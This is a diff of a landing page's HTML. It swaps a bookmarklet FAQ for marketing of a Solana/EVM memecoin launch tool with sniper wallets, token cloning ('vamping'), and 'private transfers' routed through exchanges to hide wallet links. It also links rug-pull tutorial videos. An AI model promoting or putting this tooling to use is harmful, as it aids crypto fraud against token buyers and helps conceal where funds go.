+        <div class="relative w-full max-w-[460px] rounded-xl border p-4 text-left" style="border-color:#1f2229;background:#0a0a0a">
+          <div class="flex flex-col text-sm font-semibold" style="color:#fff">Wallet Selection<span class="text-xs" style="color:rgba(255,255,255,0.4)">4 available · SOL</span></div>
+          <div class="mt-2 h-px" style="background:#1f2229"></div>
+          <div class="py-2 flex gap-1 rounded-full border p-1 mt-2" style="border-color:#1f2229">
+            <span class="flex-1 rounded-full text-xs text-center py-1" style="background:#fff;color:#000">Bundle (2)</span>
+            <span class="flex-1 rounded-full text-xs text-center py-1" style="color:rgba(255,255,255,0.6)">Sniper (2)</span>
+            <span class="flex-1 rounded-full text-xs text-center py-1" style="color:rgba(255,255,255,0.6)">Help</span>
+          </div>
+          <div class="flex flex-col gap-1.5 pt-3">
+            <div class="flex items-center gap-3 rounded-lg border px-2.5 py-2" style="border-color:#1f2229"><span class="w-4 h-4 rounded border" style="border-color:rgba(255,255,255,0.6);background:rgba(255,255,255,0.1)"></span><div class="flex-1"><div class="text-xs" style="color:#fff">Sniper 1</div><div class="text-xs" style="color:rgba(255,255,255,0.4)">2.4120 SOL</div></div><input class="h-7 w-20 rounded-md border px-2 text-right text-xs" style="border-color:#1f2229;background:#0a0a0a;color:#fff" value="0.5"></div>
+            <div class="flex items-center gap-3 rounded-lg border px-2.5 py-2" style="border-color:#1f2229"><span class="w-4 h-4 rounded border" style="border-color:rgba(255,255,255,0.6);background:rgba(255,255,255,0.1)"></span><div class="flex-1"><div class="text-xs" style="color:#fff">Sniper 2</div><div class="text-xs" style="color:rgba(255,255,255,0.4)">1.8730 SOL</div></div><input class="h-7 w-20 rounded-md border px-2 text-right text-xs" style="border-color:#1f2229;background:#0a0a0a;color:#fff" value="0.35"></div>
+            <div class="flex items-center gap-3 rounded-lg border px-2.5 py-2" style="border-color:#1f2229"><span class="w-4 h-4 rounded border" style="border-color:rgba(255,255,255,0.25)"></span><div class="flex-1"><div class="text-xs" style="color:#fff">Sniper 3</div><div class="text-xs" style="color:rgba(255,255,255,0.4)">3.0210 SOL</div></div><input class="h-7 w-20 rounded-md border px-2 text-right text-xs" style="border-color:#1f2229;background:#0a0a0a;color:#fff" value="0.3"></div>
+            <div class="flex items-center gap-3 rounded-lg border px-2.5 py-2" style="border-color:#1f2229"><span class="w-4 h-4 rounded border" style="border-color:rgba(255,255,255,0.25)"></span><div class="flex-1"><div class="text-xs" style="color:#fff">Sniper 4</div><div class="text-xs" style="color:rgba(255,255,255,0.4)">0.9640 SOL</div></div><input class="h-7 w-20 rounded-md border px-2 text-right text-xs" style="border-color:#1f2229;background:#0a0a0a;color:#fff" value="0.25"></div>
+          </div>
+        </div>
+      </div>
+    </div>
 
-  <h2>FAQ</h2>
-  <h3>Install required?</h3>
-  <p>No. Drag the button to the bookmarks bar.</p>
-  <h3>Logged out?</h3>
-  <p>Reports <code>no token</code> and stops.</p>
-  <h3>Runs in background?</h3>
-  <p>No. Runs once, on click.</p>
-  <h3>Removal?</h3>
-  <p>Right-click the bookmark, delete.</p>
+    <div class="grid lg:grid-cols-2 border-t border-white/[0.07]">
+      <div class="flex flex-col justify-center px-5 py-14 sm:px-10 lg:py-20 xl:px-14">
+        <p class="mono flex items-center gap-2.5 text-[11px] uppercase tracking-[0.18em]"><span style="color:#9EC4FF">03</span><span class="h-px w-5" style="background:linear-gradient(90deg,#F4F8FF,#9EC4FF)"></span><span class="rl-text-gradient">Position management</span></p>
+        <h3 class="display mt-5 text-[clamp(1.75rem,3.4vw,2.5rem)] font-medium leading-[1.04]" style="color:#fff">Work the chart after launch.</h3>
+        <p class="mt-4 max-w-md text-[15px] leading-relaxed" style="color:rgba(255,255,255,0.5)">Every launch opens in a trade panel with your wallets right inside it. See what each one holds, buy or sell across the ones you pick by preset, and watch bought, holding, and PnL as you go.</p>
+      </div>
+      <div class="relative flex items-center justify-center overflow-hidden px-4 py-12 sm:px-10 sm:py-16 border-t border-white/[0.07] lg:border-t-0 lg:border-l">
+        <div class="relative w-full max-w-[460px] rounded-lg border p-3" style="border-color:#1f2229;background:rgba(10,10,10,0.98)">
+          <div class="flex items-center gap-2.5 mb-3">
+            <img src="https://assets.coingecko.com/coins/images/4128/small/solana.png" alt="" class="h-5 w-5 rounded-full" onerror="this.style.display='none'">
+            <div class="flex-1"><div class="flex items-center gap-1.5"><span class="text-sm font-medium" style="color:#fff">$HOPS</span><span class="text-xs" style="color:rgba(255,255,255,0.4)">Sir Hops</span></div><span class="text-[11px]" style="color:rgba(52,211,153,0.85)">2m</span></div>
+            <span class="text-[11px]" style="color:rgba(255,255,255,0.4)">MC $48.2K</span>
+          </div>
+          <div class="rounded-md border p-2 mb-3" style="border-color:#1f2229;background:rgba(0,0,0,0.4)">
+            <svg viewBox="0 0 320 60" preserveAspectRatio="none" class="w-full h-14"><defs><linearGradient id="rl-chart" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="rgba(94,203,136,0.4)"/><stop offset="100%" stop-color="rgba(94,203,136,0)"/></linearGradient></defs><path d="M0 45 L20 42 L40 44 L60 38 L80 40 L100 32 L120 35 L140 28 L160 30 L180 22 L200 25 L220 18 L240 20 L260 14 L280 16 L300 10 L320 8 L320 60 L0 60 Z" fill="url(#rl-chart)"/><path d="M0 45 L20 42 L40 44 L60 38 L80 40 L100 32 L120 35 L140 28 L160 30 L180 22 L200 25 L220 18 L240 20 L260 14 L280 16 L300 10 L320 8" stroke="#5ECB88" stroke-width="1.5" fill="none"/></svg>
+          </div>
+          <div class="mb-3 h-px" style="background:rgba(255,255,255,0.06)"></div>
+          <div class="mb-3">
+            <div class="mb-2 flex items-center justify-between"><div class="text-xs font-medium" style="color:#fff">Wallets</div><div class="flex items-center gap-1 text-[11px]" style="color:rgba(255,255,255,0.4)"><span>All</span><span>None</span></div></div>
+            <div class="flex items-center gap-2.5 rounded-lg border px-2.5 py-2" style="border-color:#1f2229;background:rgba(255,255,255,0.02)">
+              <img src="https://avatars.githubusercontent.com/u/9919?s=64" class="h-4 w-4 rounded-full" onerror="this.style.display='none'">
+              <div class="flex-1"><div class="text-sm" style="color:#fbbf24">Dev wallet ★</div><div class="mono text-[10px]" style="color:rgba(255,255,255,0.4)">7xKq...A9bC</div></div>
+              <span class="rounded-full border px-2 py-0.5 text-[11px]" style="border-color:#1f2229;color:#fff">4.218</span>
+              <span class="rounded-full border px-2 py-0.5 text-[11px]" style="border-color:#1f2229;color:#fff">38.2M</span>
+            </div>
+          </div>
+          <div class="mb-3 h-px" style="background:rgba(255,255,255,0.06)"></div>
+          <div class="mb-3">
+            <div class="flex items-center gap-2 text-sm font-medium" style="color:#fff">Buy (SOL)<span class="text-xs" style="color:rgba(255,255,255,0.4)">1 wallet</span></div>
+            <div class="mt-2 grid grid-cols-4 gap-1.5">
+              <button class="h-9 rounded-md border text-xs" style="border-color:#1f2229;background:rgba(255,255,255,0.02);color:#fff">1</button>
+              <button class="h-9 rounded-md border text-xs" style="border-color:#1f2229;background:rgba(255,255,255,0.02);color:#fff">3</button>
+              <button class="h-9 rounded-md border text-xs" style="border-color:#1f2229;background:rgba(255,255,255,0.02);color:#fff">5</button>
+              <button class="h-9 rounded-md border text-xs" style="border-color:#1f2229;background:rgba(255,255,255,0.02);color:#fff">10</button>
+            </div>
+          </div>
+          <div>
+            <div class="flex items-center justify-between text-sm font-medium mb-2" style="color:#fff">Sell (%)<span class="text-[10px]" style="color:rgba(255,255,255,0.4)">Edit Presets</span></div>
+            <div class="grid grid-cols-4 gap-1.5">
+              <button class="h-9 rounded-md border text-xs" style="border-color:#1f2229;background:rgba(255,255,255,0.02);color:#fff">10%</button>
+              <button class="h-9 rounded-md border text-xs" style="border-color:#1f2229;background:rgba(255,255,255,0.02);color:#fff">25%</button>
+              <button class="h-9 rounded-md border text-xs" style="border-color:#1f2229;background:rgba(255,255,255,0.02);color:#fff">50%</button>
+              <button class="h-9 rounded-md border text-xs" style="border-color:rgba(239,68,68,0.3);background:rgba(239,68,68,0.1);color:#f87171">Sell All</button>
+            </div>
+          </div>
+          <div class="mt-3 flex h-8 items-center rounded-b-lg border-t text-[11px]" style="border-color:#1f2229">
+            <span class="flex-1 text-center" style="color:#4ade80">1.20</span>
+            <span class="flex-1 text-center" style="color:rgba(255,255,255,0.4)">2.91</span>
+            <span class="flex-1 text-center" style="color:#4ade80">+1.71 (142%)</span>
+          </div>
+        </div>
+      </div>
+    </div>
 
-  <footer>
-    <span>QuestPilot 2.4</span>
-    <a href="#">Docs</a>
-    <a href="#">Changelog</a>
-    <a href="#">Status</a>
-  </footer>
+    <div class="grid lg:grid-cols-2 border-t border-white/[0.07]">
+      <div class="flex flex-col justify-center px-5 py-14 sm:px-10 lg:py-20 xl:px-14 lg:order-last lg:border-l lg:border-white/[0.07]">
+        <p class="mono flex items-center gap-2.5 text-[11px] uppercase tracking-[0.18em]"><span style="color:#9EC4FF">04</span><span class="h-px w-5" style="background:linear-gradient(90deg,#F4F8FF,#9EC4FF)"></span><span class="rl-text-gradient">Tracker &amp; AI</span></p>
+        <h3 class="display mt-5 text-[clamp(1.75rem,3.4vw,2.5rem)] font-medium leading-[1.04]" style="color:#fff">See the post, get a name.</h3>
+        <p class="mt-4 max-w-md text-[15px] leading-relaxed" style="color:rgba(255,255,255,0.5)">Follow accounts on X, Instagram, Truth Social, and news feeds in one place. Each post shows suggested names and tickers. Deploy straight away or open the form to edit first.</p>
+        <ul class="mt-8 flex flex-wrap gap-2">
+          <li class="rounded-full border px-3 py-1 text-[12px]" style="border-color:rgba(255,255,255,0.08);background:rgba(255,255,255,0.02);color:rgba(255,255,255,0.7)">X</li>
+          <li class="rounded-full border px-3 py-1 text-[12px]" style="border-color:rgba(255,255,255,0.08);background:rgba(255,255,255,0.02);color:rgba(255,255,255,0.7)">Instagram</li>
+          <li class="rounded-full border px-3 py-1 text-[12px]" style="border-color:rgba(255,255,255,0.08);background:rgba(255,255,255,0.02);color:rgba(255,255,255,0.7)">Truth Social</li>
+          <li class="rounded-full border px-3 py-1 text-[12px]" style="border-color:rgba(255,255,255,0.08);background:rgba(255,255,255,0.02);color:rgba(255,255,255,0.7)">News</li>
+        </ul>
+      </div>
+      <div class="relative flex items-center justify-center overflow-hidden px-4 py-12 sm:px-10 sm:py-16 border-t border-white/[0.07] lg:border-t-0">
+        <div class="relative w-full max-w-[560px] rounded-xl border p-3" style="border-color:#1f2229;background:#0a0a0a">
+          <div class="flex items-center justify-between border-b pb-2 mb-3" style="border-color:#1f2229">
+            <div><div class="flex items-center gap-1.5"><span class="text-sm font-semibold" style="color:#fff">Office Diaries</span><span class="text-xs" style="color:rgba(255,255,255,0.4)">2s</span></div><div class="text-xs" style="color:rgba(255,255,255,0.4)">@officediaries · 238K</div></div>
+            <span class="text-xs" style="color:#fff">Deploy ›</span>
+          </div>
+          <p class="text-sm mb-3" style="color:rgba(255,255,255,0.8)">this cat walked into our office on monday. he now has a desk, a badge, and a better salary than me</p>
+          <div class="flex flex-col rounded-md border overflow-hidden" style="border-color:#1f2229;background:rgba(255,255,255,0.02)">
+            <div class="flex items-center px-2 py-1.5 border-b" style="border-color:#1f2229"><img src="https://assets.coingecko.com/coins/images/37212/small/meow.jpg" class="w-10 h-10 rounded-l-sm object-cover" alt="" onerror="this.style.background='#1f2229'"><div class="flex-1 px-2"><div class="text-[11px] font-semibold" style="color:#fff">cat in a dogs world</div><div class="text-[10px]" style="color:rgba(255,255,255,0.4)">$MEW</div></div><span style="color:rgba(255,255,255,0.4)">✎</span></div>
+            <div class="flex items-center px-2 py-1.5 border-b" style="border-color:#1f2229"><img src="https://assets.coingecko.com/coins/images/37575/small/popcat.png" class="w-10 h-10 rounded-l-sm object-cover" alt="" onerror="this.style.background='#1f2229'"><div class="flex-1 px-2"><div class="text-[11px] font-semibold" style="color:#fff">Popcat</div><div class="text-[10px]" style="color:rgba(255,255,255,0.4)">$POPCAT</div></div><span style="color:rgba(255,255,255,0.4)">✎</span></div>
+            <div class="flex items-center px-2 py-1.5 border-b" style="border-color:#1f2229"><img src="https://assets.coingecko.com/coins/images/39740/small/simons-cat.jpg" class="w-10 h-10 rounded-l-sm object-cover" alt="" onerror="this.style.background='#1f2229'"><div class="flex-1 px-2"><div class="text-[11px] font-semibold" style="color:#fff">Simon's Cat</div><div class="text-[10px]" style="color:rgba(255,255,255,0.4)">$CAT</div></div><span style="color:rgba(255,255,255,0.4)">✎</span></div>
+            <div class="flex items-center px-2 py-1.5 border-b" style="border-color:#1f2229"><img src="https://assets.coingecko.com/coins/images/36076/small/bome.png" class="w-10 h-10 rounded-l-sm object-cover" alt="" onerror="this.style.background='#1f2229'"><div class="flex-1 px-2"><div class="text-[11px] font-semibold" style="color:#fff">BOOK OF MEME</div><div class="text-[10px]" style="color:rgba(255,255,255,0.4)">$BOME</div></div><span style="color:rgba(255,255,255,0.4)">✎</span></div>
+            <div class="flex items-center px-2 py-1.5"><img src="https://assets.coingecko.com/coins/images/33566/small/dogwifhat.jpg" class="w-10 h-10 rounded-l-sm object-cover" alt="" onerror="this.style.background='#1f2229'"><div class="flex-1 px-2"><div class="text-[11px] font-semibold" style="color:#fff">dogwifhat</div><div class="text-[10px]" style="color:rgba(255,255,255,0.4)">$WIF</div></div><span style="color:rgba(255,255,255,0.4)">✎</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="grid lg:grid-cols-2 border-t border-white/[0.07]">
+      <div class="flex flex-col justify-center px-5 py-14 sm:px-10 lg:py-20 xl:px-14">
+        <p class="mono flex items-center gap-2.5 text-[11px] uppercase tracking-[0.18em]"><span style="color:#9EC4FF">05</span><span class="h-px w-5" style="background:linear-gradient(90deg,#F4F8FF,#9EC4FF)"></span><span class="rl-text-gradient">Vamping</span></p>
+        <h3 class="display mt-5 text-[clamp(1.75rem,3.4vw,2.5rem)] font-medium leading-[1.04]" style="color:#fff">Start from an existing token.</h3>
+        <p class="mt-4 max-w-md text-[15px] leading-relaxed" style="color:rgba(255,255,255,0.5)">Drop in a Solana mint or EVM address, pull the name, image, and links, and land in the launch form with everything filled.</p>
+      </div>
+      <div class="relative flex items-center justify-center overflow-hidden px-4 py-12 sm:px-10 sm:py-16 border-t border-white/[0.07] lg:border-t-0 lg:border-l">
+        <div class="relative w-full max-w-[460px] rounded-xl border p-4" style="border-color:#1f2229;background:#0a0a0a">
+          <h3 class="text-2xl font-bold" style="color:#fff">Vamp Coin</h3>
+          <p class="mt-1 text-sm" style="color:rgba(255,255,255,0.4)">Clone an existing token</p>
+          <label class="mb-1 mt-4 block text-sm font-medium" style="color:rgba(255,255,255,0.8)">Token Address</label>
+          <input class="flex h-10 w-full rounded-md border px-3 text-sm mono" style="border-color:#1f2229;background:#0a0a0a;color:rgba(255,255,255,0.6)" value="EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v" readonly>
+          <div class="mt-4 flex items-center justify-between gap-4 rounded-lg border p-4" style="border-color:#1f2229;background:#0a0a0a">
+            <div class="flex items-center gap-3">
+              <img src="https://assets.coingecko.com/coins/images/6319/small/usdc.png" alt="" class="h-10 w-10 rounded-full" onerror="this.style.display='none'">
+              <div><div class="text-lg font-bold" style="color:#fff">USD Coin</div><div class="text-sm" style="color:rgba(255,255,255,0.4)">USDC</div></div>
+            </div>
+            <button class="h-9 px-4 rounded-md border text-sm" style="border-color:#1f2229;background:#0a0a0a;color:rgba(255,255,255,0.6)">Edit ›</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="grid lg:grid-cols-2 border-t border-white/[0.07]">
+      <div class="flex flex-col justify-center px-5 py-14 sm:px-10 lg:py-20 xl:px-14 lg:order-last lg:border-l lg:border-white/[0.07]">
+        <p class="mono flex items-center gap-2.5 text-[11px] uppercase tracking-[0.18em]"><span style="color:#9EC4FF">06</span><span class="h-px w-5" style="background:linear-gradient(90deg,#F4F8FF,#9EC4FF)"></span><span class="rl-text-gradient">Private transfers</span></p>
+        <h3 class="display mt-5 text-[clamp(1.75rem,3.4vw,2.5rem)] font-medium leading-[1.04]" style="color:#fff">Split funds without a straight line.</h3>
+        <p class="mt-4 max-w-md text-[15px] leading-relaxed" style="color:rgba(255,255,255,0.5)">Send SOL to several wallets through exchange routes. Balances land where you need them without an obvious wallet-to-wallet hop.</p>
+      </div>
+      <div class="relative flex items-center justify-center overflow-hidden px-4 py-12 sm:px-10 sm:py-16 border-t border-white/[0.07] lg:border-t-0">
+        <div class="relative w-full max-w-[460px] rounded-xl border p-4" style="border-color:#1f2229;background:#0a0a0a">
+          <div class="flex items-center justify-between"><span class="flex items-center gap-2 text-sm font-semibold" style="color:#fff">Private distribution</span><span class="text-xs" style="color:rgba(255,255,255,0.4)">12.40 SOL → 5 wallets</span></div>
+          <div class="relative mt-4 w-full" style="aspect-ratio:400/240">
+            <svg class="absolute inset-0 h-full w-full" viewBox="0 0 400 240" fill="none">
+              <defs><linearGradient id="rl-route" gradientUnits="userSpaceOnUse" x1="0" y1="0" x2="400" y2="0"><stop offset="0%" stop-color="#F4F8FF"/><stop offset="100%" stop-color="#9EC4FF"/></linearGradient></defs>
+              <path d="M46 120C121 120 121 55 196 55" stroke="rgba(158,196,255,0.1)" stroke-width="7" stroke-linecap="round"/><path d="M46 120C121 120 121 55 196 55" class="rl-flow" stroke="url(#rl-route)" stroke-width="3" stroke-linecap="round"/>
+              <path d="M46 120C121 120 121 120 196 120" stroke="rgba(158,196,255,0.1)" stroke-width="6" stroke-linecap="round"/><path d="M46 120C121 120 121 120 196 120" class="rl-flow" stroke="url(#rl-route)" stroke-width="2" stroke-linecap="round"/>
+              <path d="M46 120C121 120 121 185 196 185" stroke="rgba(158,196,255,0.1)" stroke-width="7" stroke-linecap="round"/><path d="M46 120C121 120 121 185 196 185" class="rl-flow" stroke="url(#rl-route)" stroke-width="3" stroke-linecap="round"/>
+              <path d="M196 55C267 55 267 24 338 24" stroke="rgba(158,196,255,0.1)" stroke-width="6" stroke-linecap="round"/><path d="M196 55C267 55 267 24 338 24" class="rl-flow" stroke="url(#rl-route)" stroke-width="2" stroke-linecap="round"/>
+              <path d="M196 55C267 55 267 72 338 72" stroke="rgba(158,196,255,0.1)" stroke-width="6" stroke-linecap="round"/><path d="M196 55C267 55 267 72 338 72" class="rl-flow" stroke="url(#rl-route)" stroke-width="2" stroke-linecap="round"/>
+              <path d="M196 120C267 120 267 120 338 120" stroke="rgba(158,196,255,0.1)" stroke-width="6" stroke-linecap="round"/><path d="M196 120C267 120 267 120 338 120" class="rl-flow" stroke="url(#rl-route)" stroke-width="2" stroke-linecap="round"/>
+              <path d="M196 185C267 185 267 168 338 168" stroke="rgba(158,196,255,0.1)" stroke-width="6" stroke-linecap="round"/><path d="M196 185C267 185 267 168 338 168" class="rl-flow" stroke="url(#rl-route)" stroke-width="2" stroke-linecap="round"/>
+              <path d="M196 185C267 185 267 216 338 216" stroke="rgba(158,196,255,0.1)" stroke-width="6" stroke-linecap="round"/><path d="M196 185C267 185 267 216 338 216" class="rl-flow" stroke="url(#rl-route)" stroke-width="2" stroke-linecap="round"/>
+            </svg>
+            <div class="absolute" style="left:11.5%;top:50%;transform:translate(-50%,-50%)"><span class="rounded-lg border px-2 py-1.5 text-[11px]" style="border-color:rgba(158,196,255,0.4);background:#10141C;color:#fff">12.40</span></div>
+            <div class="absolute" style="left:49%;top:23%;transform:translate(-50%,-50%)"><span class="rounded-full border px-2.5 py-0.5 text-[11px]" style="border-color:#1f2229;background:#0a0a0a;color:#fff">Binance</span></div>
+            <div class="absolute" style="left:49%;top:50%;transform:translate(-50%,-50%)"><span class="rounded-full border px-2.5 py-0.5 text-[11px]" style="border-color:#1f2229;background:#0a0a0a;color:#fff">Bybit</span></div>
+            <div class="absolute" style="left:49%;top:77%;transform:translate(-50%,-50%)"><span class="rounded-full border px-2.5 py-0.5 text-[11px]" style="border-color:#1f2229;background:#0a0a0a;color:#fff">KuCoin</span></div>
+            <div class="absolute" style="left:84.5%;top:10%;transform:translate(-50%,-50%)"><span class="rounded-md border px-2 py-0.5 text-[11px]" style="border-color:#1f2229;background:#0a0a0a;color:#fff">2.48</span></div>
+            <div class="absolute" style="left:84.5%;top:30%;transform:translate(-50%,-50%)"><span class="rounded-md border px-2 py-0.5 text-[11px]" style="border-color:#1f2229;background:#0a0a0a;color:#fff">3.10</span></div>
+            <div class="absolute" style="left:84.5%;top:50%;transform:translate(-50%,-50%)"><span class="rounded-md border px-2 py-0.5 text-[11px]" style="border-color:#1f2229;background:#0a0a0a;color:#fff">1.92</span></div>
+            <div class="absolute" style="left:84.5%;top:70%;transform:translate(-50%,-50%)"><span class="rounded-md border px-2 py-0.5 text-[11px]" style="border-color:#1f2229;background:#0a0a0a;color:#fff">2.65</span></div>
+            <div class="absolute" style="left:84.5%;top:90%;transform:translate(-50%,-50%)"><span class="rounded-md border px-2 py-0.5 text-[11px]" style="border-color:#1f2229;background:#0a0a0a;color:#fff">2.25</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="creators" class="relative border-t border-white/[0.07]">
+    <div class="flex items-end justify-between gap-8 px-5 pt-20 sm:px-10 sm:pt-24 xl:px-14">
+      <div class="max-w-xl">
+        <p class="mono flex items-center gap-2.5 text-[11px] uppercase tracking-[0.18em]"><span class="h-px w-5" style="background:linear-gradient(90deg,#F4F8FF,#9EC4FF)"></span><span class="rl-text-gradient">In the wild</span></p>
+        <h2 class="display mt-5 text-[clamp(2rem,4.2vw,3rem)] font-medium leading-[1.02]" style="color:#fff">Watch how people launch.</h2>
+        <p class="mt-4 text-[15px] leading-relaxed sm:text-[16px]" style="color:rgba(255,255,255,0.5)">Walkthroughs and breakdowns from creators on YouTube.</p>
+      </div>
+    </div>
+    <div class="no-scrollbar mt-12 snap-x snap-mandatory overflow-x-auto pb-20 sm:pb-24">
+      <div class="flex w-max gap-4 px-5 sm:px-10 xl:px-14">
+        <article class="w-[280px] shrink-0 snap-start overflow-hidden rounded-xl border sm:w-[340px]" style="border-color:rgba(255,255,255,0.1);background:#0D0D0D">
+          <div class="relative aspect-video overflow-hidden" style="background:#000">
+            <img src="https://i.ytimg.com/vi/oRVMXsEKozE/maxresdefault.jpg" class="absolute inset-0 h-full w-full object-cover" onerror="this.src='https://i.ytimg.com/vi/oRVMXsEKozE/hqdefault.jpg'">
+            <a href="https://www.youtube.com/watch?v=oRVMXsEKozE" target="_blank" rel="noopener noreferrer" class="absolute inset-0 flex items-center justify-center" style="background:linear-gradient(180deg,rgba(0,0,0,0.1),rgba(0,0,0,0.5))"><span class="flex h-12 w-12 items-center justify-center rounded-full border" style="border-color:rgba(255,255,255,0.25);background:rgba(255,255,255,0.1);backdrop-filter:blur(12px);color:#fff">▶</span></a>
+          </div>
+          <div class="border-t px-4 py-4" style="border-color:rgba(255,255,255,0.06)"><h3 class="truncate text-[14px] font-medium" style="color:#fff">How to Dev a Memecoin with Rapid Launch</h3><p class="mono mt-1.5 text-[11px]" style="color:rgba(255,255,255,0.4)">MagikerN</p></div>
+        </article>
+        <article class="w-[280px] shrink-0 snap-start overflow-hidden rounded-xl border sm:w-[340px]" style="border-color:rgba(255,255,255,0.1);background:#0D0D0D">
+          <div class="relative aspect-video overflow-hidden" style="background:#000">
+            <img src="https://i.ytimg.com/vi/AX5cod8ztfU/maxresdefault.jpg" class="absolute inset-0 h-full w-full object-cover" onerror="this.src='https://i.ytimg.com/vi/AX5cod8ztfU/hqdefault.jpg'">
+            <a href="https://www.youtube.com/watch?v=AX5cod8ztfU" target="_blank" rel="noopener noreferrer" class="absolute inset-0 flex items-center justify-center" style="background:linear-gradient(180deg,rgba(0,0,0,0.1),rgba(0,0,0,0.5))"><span class="flex h-12 w-12 items-center justify-center rounded-full border" style="border-color:rgba(255,255,255,0.25);background:rgba(255,255,255,0.1);backdrop-filter:blur(12px);color:#fff">▶</span></a>
+          </div>
+          <div class="border-t px-4 py-4" style="border-color:rgba(255,255,255,0.06)"><h3 class="truncate text-[14px] font-medium" style="color:#fff">How I Made $20K Rugging Memecoins</h3><p class="mono mt-1.5 text-[11px]" style="color:rgba(255,255,255,0.4)">Sniff</p></div>
+        </article>
+        <article class="w-[280px] shrink-0 snap-start overflow-hidden rounded-xl border sm:w-[340px]" style="border-color:rgba(255,255,255,0.1);background:#0D0D0D">
+          <div class="relative aspect-video overflow-hidden" style="background:#000">
+            <img src="https://i.ytimg.com/vi/C5j_1KvOqsU/maxresdefault.jpg" class="absolute inset-0 h-full w-full object-cover" onerror="this.src='https://i.ytimg.com/vi/C5j_1KvOqsU/hqdefault.jpg'">
+            <a href="https://www.youtube.com/watch?v=C5j_1KvOqsU" target="_blank" rel="noopener noreferrer" class="absolute inset-0 flex items-center justify-center" style="background:linear-gradient(180deg,rgba(0,0,0,0.1),rgba(0,0,0,0.5))"><span class="flex h-12 w-12 items-center justify-center rounded-full border" style="border-color:rgba(255,255,255,0.25);background:rgba(255,255,255,0.1);backdrop-filter:blur(12px);color:#fff">▶</span></a>
+          </div>
+          <div class="border-t px-4 py-4" style="border-color:rgba(255,255,255,0.06)"><h3 class="truncate text-[14px] font-medium" style="color:#fff">How To Rug Pull Memecoins on Pump Fun</h3><p class="mono mt-1.5 text-[11px]" style="color:rgba(255,255,255,0.4)">Ethan Prosper</p></div>
+        </article>
+        <article class="w-[280px] shrink-0 snap-start overflow-hidden rounded-xl border sm:w-[340px]" style="border-color:rgba(255,255,255,0.1);background:#0D0D0D">
+          <div class="relative aspect-video overflow-hidden" style="background:#000">
+            <img src="https://i.ytimg.com/vi/pb179jL_AYo/maxresdefault.jpg" class="absolute inset-0 h-full w-full object-cover" onerror="this.src='https://i.ytimg.com/vi/pb179jL_AYo/hqdefault.jpg'">
+            <a href="https://www.youtube.com/watch?v=pb179jL_AYo" target="_blank" rel="noopener noreferrer" class="absolute inset-0 flex items-center justify-center" style="background:linear-gradient(180deg,rgba(0,0,0,0.1),rgba(0,0,0,0.5))"><span class="flex h-12 w-12 items-center justify-center rounded-full border" style="border-color:rgba(255,255,255,0.25);background:rgba(255,255,255,0.1);backdrop-filter:blur(12px);color:#fff">▶</span></a>
+          </div>
+          <div class="border-t px-4 py-4" style="border-color:rgba(255,255,255,0.06)"><h3 class="truncate text-[14px] font-medium" style="color:#fff">How To Get Rich CREATING Memecoins in 2026</h3><p class="mono mt-1.5 text-[11px]" style="color:rgba(255,255,255,0.4)">antonelli</p></div>
+        </article>
+        <article class="w-[280px] shrink-0 snap-start overflow-hidden rounded-xl border sm:w-[340px]" style="border-color:rgba(255,255,255,0.1);background:#0D0D0D">
+          <div class="relative aspect-video overflow-hidden" style="background:#000">
+            <img src="https://i.ytimg.com/vi/qhLHiq_po1I/maxresdefault.jpg" class="absolute inset-0 h-full w-full object-cover" onerror="this.src='https://i.ytimg.com/vi/qhLHiq_po1I/hqdefault.jpg'">
+            <a href="https://www.youtube.com/watch?v=qhLHiq_po1I" target="_blank" rel="noopener noreferrer" class="absolute inset-0 flex items-center justify-center" style="background:linear-gradient(180deg,rgba(0,0,0,0.1),rgba(0,0,0,0.5))"><span class="flex h-12 w-12 items-center justify-center rounded-full border" style="border-color:rgba(255,255,255,0.25);background:rgba(255,255,255,0.1);backdrop-filter:blur(12px);color:#fff">▶</span></a>
+          </div>
+          <div class="border-t px-4 py-4" style="border-color:rgba(255,255,255,0.06)"><h3 class="truncate text-[14px] font-medium" style="color:#fff">How I Make 100X Memecoins - Full Course 2026</h3><p class="mono mt-1.5 text-[11px]" style="color:rgba(255,255,255,0.4)">Ethan Prosper</p></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section id="developers" class="relative border-t border-white/[0.07] overflow-hidden">
+    <div class="grid grid-cols-1 lg:grid-cols-2">
+      <div class="px-5 py-20 sm:px-10 sm:py-24 xl:px-14">
+        <div class="max-w-xl">
+          <p class="mono flex items-center gap-2.5 text-[11px] uppercase tracking-[0.18em]"><span class="h-px w-5" style="background:linear-gradient(90deg,#F4F8FF,#9EC4FF)"></span><span class="rl-text-gradient">Developers</span></p>
+          <h2 class="display mt-5 text-[clamp(2rem,4.2vw,3rem)] font-medium leading-[1.02]" style="color:#fff">Deploy with one HTTP call.</h2>
+          <p class="mt-4 text-[15px] leading-relaxed sm:text-[16px]" style="color:rgba(255,255,255,0.5)">Solana posts to /solana/deploy, EVM to /evm/deploy. Bundle, snipe, buy, and sell hit the same endpoints the app uses.</p>
+        </div>
+        <ul class="mt-10 grid gap-2" style="list-style:none;padding:0">
+          <li><a href="#" class="flex items-start justify-between gap-6 rounded-xl border px-5 py-4" style="border-color:rgba(255,255,255,0.06);background:rgba(255,255,255,0.015);text-decoration:none"><span><span class="block text-[15px] font-medium" style="color:#fff">Deploy API</span><span class="mt-1 block text-[13px]" style="color:rgba(255,255,255,0.45)">Quick-start in the docs. Multipart or JSON, with an image file or URL.</span></span><span style="color:rgba(255,255,255,0.25)">↗</span></a></li>
+          <li><a href="#" class="flex items-start justify-between gap-6 rounded-xl border px-5 py-4" style="border-color:rgba(255,255,255,0.06);background:rgba(255,255,255,0.015);text-decoration:none"><span><span class="block text-[15px] font-medium" style="color:#fff">For agents</span><span class="mt-1 block text-[13px]" style="color:rgba(255,255,255,0.45)">Full product context at /llms-full.txt for scripts and automation.</span></span><span style="color:rgba(255,255,255,0.25)">↗</span></a></li>
+        </ul>
+      </div>
+      <div class="relative flex items-center justify-center overflow-hidden px-4 py-12 sm:px-10 sm:py-16 border-t border-white/[0.07] lg:border-l lg:border-t-0">
+        <div class="pointer-events-none absolute inset-0 rl-grid" style="mask-image:radial-gradient(ellipse 75% 70% at 50% 50%, black, transparent);-webkit-mask-image:radial-gradient(ellipse 75% 70% at 50% 50%, black, transparent)" aria-hidden="true"></div>
